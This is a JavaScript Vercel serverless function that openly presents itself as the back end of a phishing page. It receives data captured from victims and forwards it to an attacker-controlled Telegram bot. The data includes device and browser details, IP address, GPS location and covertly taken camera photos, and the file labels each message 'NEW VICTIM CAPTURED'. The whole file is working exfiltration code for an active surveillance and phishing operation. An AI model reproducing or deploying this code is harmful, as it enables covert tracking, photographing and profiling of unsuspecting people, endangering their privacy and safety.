/**
 * Vercel Serverless Function — Captures victim data from the phishing page
 * and forwards it to the Telegram bot.
 *
 * Environment variables (set in Vercel Dashboard):
 *   BOT_TOKEN — Your Telegram bot token from @BotFather
 *   OWNER_ID  — Your Telegram user ID (numeric)
 */

export default async function handler(req, res) {
  // CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const OWNER_ID = process.env.OWNER_ID;

  if (!BOT_TOKEN || !OWNER_ID) {
    console.error("Missing BOT_TOKEN or OWNER_ID environment variables");
    return res.status(500).json({ error: "Server configuration error" });
  }

  const data = req.body;
  console.log("📥 Received data:", JSON.stringify(data, null, 2));

  // ─── Send text message with victim info ────────────────────────
  const locationLink = data.location
    ? `<a href="${data.location}">📍 View on Google Maps</a>`
    : "🚫 Not available";

  const message = [
    `🔥 <b>NEW VICTIM CAPTURED</b> 🔥`,
    ``,
    `🆔 <b>Victim ID:</b> <code>${data.victim_id || "N/A"}</code>`,
    `📱 <b>Device:</b> ${data.device || "N/A"}`,
    `🖥 <b>OS:</b> ${data.os || "N/A"}`,
    `🌐 <b>Browser:</b> ${data.browser || "N/A"}`,
    `🔋 <b>Battery:</b> ${data.battery || "N/A"}`,
    `📍 <b>Location:</b> ${locationLink}`,
    `🌍 <b>IP:</b> ${data.ip || "N/A"}`,
    `⏰ <b>Timestamp:</b> ${data.timestamp || "N/A"}`,
    ``,
    `<i>User-Agent:</i> <code>${(data.userAgent || "N/A").substring(0, 150)}</code>`,
  ].join("\n");

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: OWNER_ID,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: false,
      }),
    });
  } catch (err) {
    console.error("❌ Failed to send Telegram message:", err);
  }

  // ─── Send camera photo if captured ────────────────────────────
  if (data.photo) {
    try {
      const photoBuffer = Buffer.from(data.photo, "base64");
      const formData = new FormData();
      formData.append("chat_id", OWNER_ID);
      formData.append(
        "photo",
        new Blob([photoBuffer], { type: "image/jpeg" }),
        `victim_${data.victim_id || "unknown"}.jpg`
      );

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData,
      });
    } catch (err) {
      console.error("❌ Failed to send photo:", err);
    }
  }

  return res.status(200).json({ success: true });
}
